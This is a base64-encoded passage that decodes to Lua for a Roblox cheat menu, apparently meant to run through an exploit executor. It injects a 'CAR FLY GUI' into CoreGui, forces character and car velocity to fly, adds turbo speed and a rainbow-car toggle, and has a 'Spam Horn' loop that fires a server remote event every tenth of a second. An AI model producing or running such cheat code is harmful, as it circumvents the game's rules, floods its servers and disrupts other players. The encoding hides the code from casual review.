zgyNDk2MDYiLCAxODAsIGZ1bmN0aW9uKCkKICAgIGZseWluZyA9IHRydWUKICAgIHdoaWxlIGZseWluZyBkbwogICAgICAgIGlmIGh1bWFub2lkUm9vdFBhcnQgdGhlbgogICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5ID0gLWh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lLkxvb2tWZWN0b3IgKiBzcGVlZAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgpCiAgICBlbmQKZW5kKQoKbG9jYWwgbGVmdEJ1dHRvbiA9IGNyZWF0ZUltYWdlQnV0dG9uKCJMZWZ0QnV0dG9uIiwgVURpbTIubmV3KDEsIC0yMTAsIDAuMywgMCksICIxODQ3ODI0OTYwNiIsIC05MCwgZnVuY3Rpb24oKQogICAgZmx5aW5nID0gdHJ1ZQogICAgd2hpbGUgZmx5aW5nIGRvCiAgICAgICAgaWYgaHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkgPSAtaHVtYW5vaWRSb290UGFydC5DRnJhbWUuUmlnaHRWZWN0b3IgKiBzcGVlZAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgpCiAgICBlbmQKZW5kKQoKbG9jYWwgcmlnaHRCdXR0b24gPSBjcmVhdGVJbWFnZUJ1dHRvbigiUmlnaHRCdXR0b24iLCBVRGltMi5uZXcoMSwgLTE0MCwgMC4zLCAwKSwgIjE4NDc4MjQ5NjA2IiwgOTAsIGZ1bmN0aW9uKCkKICAgIGZseWluZyA9IHRydWUKICAgIHdoaWxlIGZseWluZyBkbwogICAgICAgIGlmIGh1bWFub2lkUm9vdFBhcnQgdGhlbgogICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5ID0gaHVtYW5vaWRSb290UGFydC5DRnJhbWUuUmlnaHRWZWN0b3IgKiBzcGVlZAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgpCiAgICBlbmQKZW5kKQoKbG9jYWwgZnVuY3Rpb24gc3RvcEZseWluZygpCiAgICBmbHlpbmcgPSBmYWxzZQogICAgaWYgaHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICBlbmQKZW5kCgpmb3J3YXJkQnV0dG9uLk1vdXNlQnV0dG9uMVVwOkNvbm5lY3Qoc3RvcEZseWluZykKYmFja0J1dHRvbi5Nb3VzZUJ1dHRvbjFVcDpDb25uZWN0KHN0b3BGbHlpbmcpCmxlZnRCdXR0b24uTW91c2VCdXR0b24xVXA6Q29ubmVjdChzdG9wRmx5aW5nKQpyaWdodEJ1dHRvbi5Nb3VzZUJ1dHRvbjFVcDpDb25uZWN0KHN0b3BGbHlpbmcpCgpsb2NhbCB0dXJib0J1dHRvbiA9IEluc3RhbmNlLm5ldygiSW1hZ2VCdXR0b24iLCBzY3JlZW5HdWkpCnR1cmJvQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMCwgNjAsIDAsIDYwKQp0dXJib0J1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAtMTMwLCAwLCAxMCkKdHVyYm9CdXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKdHVyYm9CdXR0b24uSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzk3NjA3NTc5Mzg2NDE4Igp0dXJib0J1dHRvbi5Nb3VzZUJ1dHRvbjFEb3duOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgc3BlZWQgPSAzMDAKZW5kKQoKLS0gTWluaW1pemUgYnV0dG9uICh3aXRoICIrIiBvciAiLSIgZGVwZW5kaW5nIG9uIHRoZSBzdGF0ZSkKbG9jYWwgbWluaW1pemVCdXR0b24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBzY3JlZW5HdWkpCm1pbmltaXplQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMCwgNjAsIDAsIDYwKQptaW5pbWl6ZUJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxMCwgMCwgMTApICAtLSBDaGFuZ2VkIHRvIHRvcC1sZWZ0IGNvcm5lcgptaW5pbWl6ZUJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQptaW5pbWl6ZUJ1dHRvbi5UZXh0ID0gIi0iICAtLSBTdGFydHMgd2l0aCAiLSIgc3ltYm9sCm1pbmltaXplQnV0dG9uLlRleHRTaXplID0gNDAKbWluaW1pemVCdXR0b24uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCgpsb2NhbCBidXR0b25zID0ge2ZvcndhcmRCdXR0b24sIGJhY2tCdXR0b24sIGxlZnRCdXR0b24sIHJpZ2h0QnV0dG9uLCB0dXJib0J1dHRvbn0KCmxvY2FsIG1pbmltaXplZCA9IGZhbHNlCgpsb2NhbCBmdW5jdGlvbiB0b2dnbGVCdXR0b25zKCkKICAgIG1pbmltaXplZCA9IG5vdCBtaW5pbWl6ZWQKICAgIGZvciBfLCBidXR0b24gaW4gaXBhaXJzKGJ1dHRvbnMpIGRvCiAgICAgICAgYnV0dG9uLlZpc2libGUgPSBub3QgbWluaW1pemVkCiAgICBlbmQKICAgIC0tIENoYW5nZSB0aGUgdGV4dCBvZiB0aGUgbWluaW1pemUgYnV0dG9uCiAgICBpZiBtaW5pbWl6ZWQgdGhlbgogICAgICAgIG1pbmltaXplQnV0dG9uLlRleHQgPSAiKyIKICAgIGVsc2UKICAgICAgICBtaW5pbWl6ZUJ1dHRvbi5UZXh0ID0gIi0iCiAgICBlbmQKZW5kCgptaW5pbWl6ZUJ1dHRvbi5Nb3VzZUJ1dHRvbjFEb3duOkNvbm5lY3QodG9nZ2xlQnV0dG9ucykgICAgCiAgICBlbmQKfSkKCi0tIENhciBSR0IgU2VjdGlvbgpsb2NhbCBSR0JTZWN0aW9uID0gQ2FyVGFiOkFkZFNlY3Rpb24oeyLwn5qY77ixUmFpbmJvdyBDYXIifSkKCkNhclRhYjpBZGRQYXJhZ3JhcGgoeyLwn5OE77ixTm90ZToiLCAiQWN0aXZhdGluZyB0aGlzIHdpbGwgbWFrZSB5b3VyIGNhciB3aXRoIG11bHRpcGxlIGNvbG9ycy4ifSkKCkNhclRhYjpBZGRUb2dnbGUoewogICAgTmFtZSA9ICJSYWluYm93IENhciIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGlzQ29sb3JDaGFuZ2luZyA9IHN0YXRlCiAgICAgICAgaWYgaXNDb2xvckNoYW5naW5nIHRoZW4KICAgICAgICAgICAgY29sb3JDaGFuZ2VDb3JvdXRpbmUgPSBjb3JvdXRpbmUuY3JlYXRlKGNoYW5nZUNhckNvbG9yKQogICAgICAgICAgICBjb3JvdXRpbmUucmVzdW1lKGNvbG9yQ2hhbmdlQ29yb3V0aW5lKQogICAgICAgIGVuZAogICAgZW5kCn0pCgoKLS0gU3BhbSBIb3JuIFNlY3Rpb24KbG9jYWwgSG9yblNlY3Rpb24gPSBDYXJUYWI6QWRkU2VjdGlvbih7IvCfk6LvuLFTcGFtIEhvcm5zIn0pCgpsb2NhbCBzcGFtbWluZyA9IGZhbHNlCmxvY2FsIGFyZ3MgPSB7Ikhvcm4ifQoKbG9jYWwgZnVuY3Rpb24gc3BhbUhvcm4oKQogICAgd2hpbGUgc3BhbW1pbmcgZG8KICAgICAgICByZW1vdGVFdmVudDpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICB3YWl0KDAuMSkKICAgIGVuZAplbmQKCkNhclRhYjpBZGRUb2dnbGUoewogICAgTmFtZSA9ICJTcGFtIEhvcm4iLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBzcGFtbWluZyA9IHZhbHVlCiAgICAgICAgaWYgc3BhbW1pbmcgdGhlbgogICAgICAgICAgICBzcGF3bihzcGFtSG9ybikKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gRmx5IENhciBTZWN0aW9uCmxvY2FsIEZseVNlY3Rpb24gPSBDYXJUYWI6QWRkU2VjdGlvbih7IvCfprjvuLFGbHkgQ2FycyJ9KQoKQ2FyVGFiOkFkZFBhcmFncmFwaCh7IvCfk4TvuLFOb3RlOiIsICJCeSBhY3RpdmF0aW5nIHRoaXMsIHlvdSBjYW4gZmx5IHdpdGggeW91ciBjYXIuIn0pCgpDYXJUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiRmx5IGNhciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKCi0tIEluc3RhbmNlczoKbG9jYWwgRmx5bWd1aXYyID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQpsb2NhbCBEcmFnID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCmxvY2FsIEZseUZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCmxvY2FsIGRkbnNmYmZ3ZXdlZmUgPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQpsb2NhbCBTcGVlZCA9IEluc3RhbmNlLm5ldygiVGV4dEJveCIpCmxvY2FsIEZseSA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCmxvY2FsIFNwZWVlZCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKbG9jYWwgU3RhdCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKbG9jYWwgU3RhdDIgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCmxvY2FsIFVuZmx5ID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKbG9jYWwgVmZseSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKbG9jYWwgQ2xvc2UgPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQpsb2NhbCBNaW5pbWl6ZSA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCmxvY2FsIEZseW9uID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCmxvY2FsIFcgPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQpsb2NhbCBTID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKCi0tUHJvcGVydGllczoKCkZseW1ndWl2Mi5OYW1lID0gIkNBUiBGTFkgR1VJIgpGbHltZ3VpdjIuUGFyZW50ID0gZ2FtZS5Db3JlR3VpCkZseW1ndWl2Mi5aSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuU2libGluZwoKRHJhZy5OYW1lID0gIkRyYWciCkRyYWcuUGFyZW50ID0gRmx5bWd1aXYyCkRyYWcuQWN0aXZlID0gdHJ1ZQpEcmFnLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKRHJhZy5Cb3JkZXJTaXplUGl4ZWwgPSAwCkRyYWcuRHJhZ2dhYmxlID0gdHJ1ZQpEcmFnLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNDgyNDM4NDE1LCAwLCAwLjQ1NDg3NDk5MiwgMCkKRHJhZy5TaXplID0gVURpbTIubmV3KDAsIDIzNywgMCwgMjcpCgpGbHlGcmFtZS5OYW1lID0gIkZseUZyYW1lIgpGbHlGcmFtZS5QYXJlbnQgPSBEcmFnCkZseUZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig4MCwgODAsIDgwKQpGbHlGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCkZseUZyYW1lLkRyYWdnYWJsZSA9IHRydWUKRmx5RnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoLTAuMDAyMDAwMDAwMDksIDAsIDAuOTg5MDAwMDIyLCAwKQpGbHlGcmFtZS5TaXplID0gVURpbTIubmV3KDAsIDIzNywgMCwgMTM5KQoKZGRuc2ZiZndld2VmZS5OYW1lID0gImRkbnNmYmZ3ZXdlZmUiCmRkbnNmYmZ3ZXdlZmUuUGFyZW50ID0gRmx5RnJhbWUKZGRuc2ZiZndld2VmZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMTUwLCAxOTEpCmRkbnNmYmZ3ZXdlZmUuQm9yZGVyU2l6ZVBpeGVsID0gMApkZG5zZmJmd2V3ZWZlLlBvc2l0aW9uID0gVURpbTIubmV3KC0wLjAwMDIxMDk2ODc3OCwgMCwgLTAuMDAzOTU2Nzk0NzQsIDApCmRkbnNmYmZ3ZXdlZmUuU2l6ZSA9IFVEaW0yLm5ldygwLCAyMzcsIDAsIDI3KQpkZG5zZmJmd2V3ZWZlLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2FucwpkZG5zZmJmd2V3ZWZlLlRleHQgPSAiQ3JlZGl0cyB0bzogTHVzcXVpbmhhIPCfmI4iCmRkbnNmYmZ3ZXdlZmUuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCmRkbnNmYmZ3ZXdlZmUuVGV4dFNjYWxlZCA9IHRydWUKZGRuc2ZiZndld2VmZS5UZXh0U2l6ZSA9IDE0LjAwMApkZG5zZmJmd2V3ZWZlLlRleHRXcmFwcGVkID0gdHJ1ZQoKU3BlZWQuTmFtZSA9ICJTcGVlZCIKU3BlZWQuUGFyZW50ID0gRmx5RnJhbWUKU3BlZWQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDYzLCA2MywgNjMpClNwZWVkLkJvcmRlckNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDE5MSkKU3BlZWQuQm9yZGVyU2l6ZVBpeGVsID0gMApTcGVlZC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjQ0NTAyNTg2MSwgMCwgMC40MDI4Nzc2ODgsIDApClNwZWVkLlNpemUgPSBVRGltMi5uZXcoMCwgMTExLCAwLCAzMykKU3BlZWQuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zClNwZWVkLlBsYWNlaG9sZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKU3BlZWQuVGV4dCA9ICI1MCIKU3BlZWQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClNwZWVkLlRleHRTY2FsZWQgPSB0cnVlClNwZWVkLlRleHRTaXplID0gMTQuMDAwClNwZWVkLlRleHRXcmFwcGVkID0gdHJ1ZQoKRmx5Lk5hbWUgPSAiRmx5IgpGbHkuUGFyZW50ID0gRmx5RnJhbWUKRmx5LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKRmx5LkJvcmRlclNpemVQaXhlbCA9IDAKRmx5LlBvc2l0aW9uID0gVURpbTIubmV3KDAuMDc1OTQ5MzYzNCwgMCwgMC43MDU3OTcwNzYsIDApCkZseS5TaXplID0gVURpbTIubmV3KDAsIDE5OSwgMCwgMzIpCkZseS5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKRmx5LlRleHQgPSAiRW5hYmxlIgpGbHkuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCkZseS5UZXh0U2NhbGVkID0gdHJ1ZQpGbHkuVGV4dFNpemUgPSAxNC4wMDAKRmx5LlRleHRXcmFwcGVkID0gdHJ1ZQpGbHkuTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCglsb2NhbCBIdW1hbm9pZFJQID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CglGbHkuVmlzaWJsZSA9IGZhbHNlCglTdGF0Mi5UZXh0ID0gIk9uIgoJU3RhdDIuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCkKCVVuZmx5LlZpc2libGUgPSB0cnVlCglGbHlvbi5WaXNpYmxlID0gdHJ1ZQoJbG9jYWwgQlYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIsSHVtYW5vaWRSUCkKCWxvY2FsIEJHID0gSW5zdGFuY2UubmV3KCJCb2R5R3lybyIsSHVtYW5vaWRSUCkKCUJWLk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLG1hdGguaHVnZSxtYXRoLmh1Z2UpCglnYW1lOkdldFNlcnZpY2UoJ1J1blNlcnZpY2UnKS5SZW5kZXJTdGVwcGVkOmNvbm5lY3QoZnVuY3Rpb24oKQoJQkcuTWF4VG9ycXVlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLG1hdGguaHVnZSxtYXRoLmh1Z2UpCglCRy5EID0gNTAwMAoJQkcuUCA9IDEwMDAwMAoJQkcuQ0ZyYW1lID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUKCWVuZCkKZW5kKQoKU3BlZWVkLk5hbWUgPSAiU3BlZWVkIgpTcGVlZWQuUGFyZW50ID0gRmx5RnJhbWUKU3BlZWVkLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig4MCwgODAsIDgwKQpTcGVlZWQuQm9yZGVyU2l6ZVBpeGVsID0gMApTcGVlZWQuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4wNzU5NDkzNjM0LCAwLCAwLjQwMjg3NzY4OCwgMCkKU3BlZWVkLlNpemUgPSBVRGltMi5uZXcoMCwgODcsIDAsIDMyKQpTcGVlZWQuWkluZGV4ID0gMApTcGVlZWQuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zClNwZWVlZC5UZXh0ID0gIlNwZWVkOiIKU3BlZWVkLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpTcGVlZWQuVGV4dFNjYWxlZCA9IHRydWUKU3BlZWVkLlRleHRTaXplID0gMTQuMDAwClNwZWVlZC5UZXh0V3JhcHBlZCA9IHRydWUKClN0YXQuTmFtZSA9ICJTdGF0IgpTdGF0LlBhcmVudCA9IEZseUZyYW1lClN0YXQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDgwLCA4MCwgODApClN0YXQuQm9yZGVyU2l6ZVBpeGVsID0gMApTdGF0LlBvc2l0aW9uID0gVURpbTIubmV3KDAuMjk5OTgzNzk5LCAwLCAwLjIzOTgxNzQ0MSwgMCkKU3RhdC5TaXplID0gVURpbTIubmV3KDAsIDg1LCAwLCAxNSkKU3RhdC5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKU3RhdC5UZXh0ID0gIlN0YXR1czoiClN0YXQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClN0YXQuVGV4dFNjYWxlZCA9IHRydWUKU3RhdC5UZXh0U2l6ZSA9IDE0LjAwMApTdGF0LlRleHRXcmFwcGVkID0gdHJ1ZQoKU3RhdDIuTmFtZSA9ICJTdGF0MiIKU3RhdDIuUGFyZW50ID0gRmx5RnJhbWUKU3RhdDIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDgwLCA4MCwgODApClN0YXQyLkJvcmRlclNpemVQaXhlbCA9IDAKU3RhdDIuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41NDY1MzUxOTQsIDAsIDAuMjM5ODE3NDQxLCAwKQpTdGF0Mi5TaXplID0gVURpbTIubmV3KDAsIDI3LCAwLCAxNSkKU3RhdDIuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zClN0YXQyLlRleHQgPSAiT2ZmIgpTdGF0Mi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKQpTdGF0Mi5UZXh0U2NhbGVkID0gdHJ1ZQpTdGF0Mi5UZXh0U2l6ZSA9IDE0LjAwMApTdGF0Mi5UZXh0V3JhcHBlZCA9IHRydWUKClVuZmx5Lk5hbWUgPSAiVW5mbHkiClVuZmx5LlBhcmVudCA9IEZseUZyYW1lClVuZmx5LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKVW5mbHkuQm9yZGVyU2l6ZVBpeGVsID0gMApVbmZseS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjA3NTk0OTM2MzQsIDAsIDAuNzA1Nzk3MDc2LCAwKQpVbmZseS5TaXplID0gVURpbTIubmV3KDAsIDE5OSwgMCwgMzIpClVuZmx5LlZpc2libGUgPSBmYWxzZQpVbmZseS5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKVW5mbHkuVGV4dCA9ICJEaXNhYmxlIgpVbmZseS5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKVW5mbHkuVGV4dFNjYWxlZCA9IHRydWUKVW5mbHkuVGV4dFNpemUgPSAxNC4wMDAKVW5mbHkuVGV4dFdyYXBwZWQgPSB0cnVlClVuZmx5Lk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJbG9jYWwgSHVtYW5vaWRSUCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAoJRmx5LlZpc2libGUgPSB0cnVlCglTdGF0Mi5UZXh0ID0gIk9mZiIKCVN0YXQyLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApCgl3YWl0KCkKCVVuZmx5LlZpc2libGUgPSBmYWxzZQoJRmx5b24uVmlzaWJsZSA9IGZhbHNlCglIdW1hbm9pZFJQOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiQm9keVZlbG9jaXR5Iik6RGVzdHJveSgpCglIdW1hbm9pZFJQOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiQm9keUd5cm8iKTpEZXN0cm95KCkKZW5kKQoKVmZseS5OYW1lID0gIlZmbHkiClZmbHkuUGFyZW50ID0gRHJhZwpWZmx5LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKVmZseS5Cb3JkZXJTaXplUGl4ZWwgPSAwClZmbHkuU2l6ZSA9IFVEaW0yLm5ldygwLCA1NywgMCwgMjcpClZmbHkuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zClZmbHkuVGV4dCA9ICJDYXIgZmx5IgpWZmx5LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpWZmx5LlRleHRTY2FsZWQgPSB0cnVlClZmbHkuVGV4dFNpemUgPSAxNC4wMDAKVmZseS5UZXh0V3JhcHBlZCA9IHRydWUKCkNsb3NlLk5hbWUgPSAiQ2xvc2UiCkNsb3NlLlBhcmVudCA9IERyYWcKQ2xvc2UuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDE1MCwgMTkxKQpDbG9zZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCkNsb3NlLlBvc2l0aW9uID0gVURpbTIubmV3KDAuODc1LCAwLCAwLCAwKQpDbG9zZS5TaXplID0gVURpbTIubmV3KDAsIDI3LCAwLCAyNykKQ2xvc2UuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zCkNsb3NlLlRleHQgPSAiWCIKQ2xvc2UuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCkNsb3NlLlRleHRTY2FsZWQgPSB0cnVlCkNsb3NlLlRleHRTaXplID0gMTQuMDAwCkNsb3NlLlRleHRXcmFwcGVkID0gdHJ1ZQpDbG9zZS5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCUZseW1ndWl2MjpEZXN0cm95KCkKZW5kKQoKTWluaW1pemUuTmFtZSA9ICJNaW5pbWl6ZSIKTWluaW1pemUuUGFyZW50ID0gRHJhZwpNaW5pbWl6ZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMTUwLCAxOTEpCk1pbmltaXplLkJvcmRlclNpemVQaXhlbCA9IDAKTWluaW1pemUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC43NSwgMCwgMCwgMCkKTWluaW1pemUuU2l6ZSA9IFVEaW0yLm5ldygwLCAyNywgMCwgMjcpCk1pbmltaXplLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2FucwpNaW5pbWl6ZS5UZXh0ID0gIi0iCk1pbmltaXplLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpNaW5pbWl6ZS5UZXh0U2NhbGVkID0gdHJ1ZQpNaW5pbWl6ZS5UZXh0U2l6ZSA9IDE0LjAwMApNaW5pbWl6ZS5UZXh0V3JhcHBlZCA9IHRydWUKZnVuY3Rpb24gTWluaSgpCglpZiBNaW5pbWl6ZS5UZXh0ID09ICItIiB0aGVuCgkJTWluaW1pemUuVGV4dCA9ICIrIgoJCUZseUZyYW1lLlZpc2libGUgPSBmYWxzZQoJZWxzZWlmIE1pbmltaXplLlRleHQgPT0gIisiIHRoZW4KCQlNaW5pbWl6ZS5UZXh0ID0gIi0iCgkJRmx5RnJhbWUuVmlzaWJsZSA9IHRydWUKCWVuZAplbmQKTWluaW1pemUuTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChNaW5pKQoKRmx5b24uTmFtZSA9ICJGbHkgb24iCkZseW9uLlBhcmVudCA9IEZseW1ndWl2MgpGbHlvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKRmx5b24uQm9yZGVyU2l6ZVBpeGVsID0gMApGbHlvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjExNzY0NzA2NywgMCwgMC41NTAyODQ2MjQsIDApCkZseW9uLlNpemUgPSBVRGltMi5uZXcoMC4xNDgwMDAwMDIsIDAsIDAuMzE0OTk5OTk4LCAwKQpGbHlvbi5WaXNpYmxlID0gZmFsc2UKRmx5b24uQWN0aXZlID0gdHJ1ZQpGbHlvbi5EcmFnZ2FibGUgPSB0cnVlCgpXLk5hbWUgPSAiVyIKVy5QYXJlbnQgPSBGbHlvbgpXLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKVy5Cb3JkZXJTaXplUGl4ZWwgPSAwClcuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xMzQ3MTk1MjEsIDAsIDAuMDE1MjAxMzMwMiwgMCkKVy5TaXplID0gVURpbTIubmV3KDAuNzA4OTk5OTkxLCAwLCAwLjQ5OTAwMDAxMywgMCkKVy5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKVy5UZXh0ID0gIl4iClcuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClcuVGV4dFNjYWxlZCA9IHRydWUKVy5UZXh0U2l6ZSA9IDE0LjAwMApXLlRleHRXcmFwcGVkID0gdHJ1ZQpXLlRvdWNoTG9uZ1ByZXNzOkNvbm5lY3QoZnVuY3Rpb24oKQoJbG9jYWwgSHVtYW5vaWRSUCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJS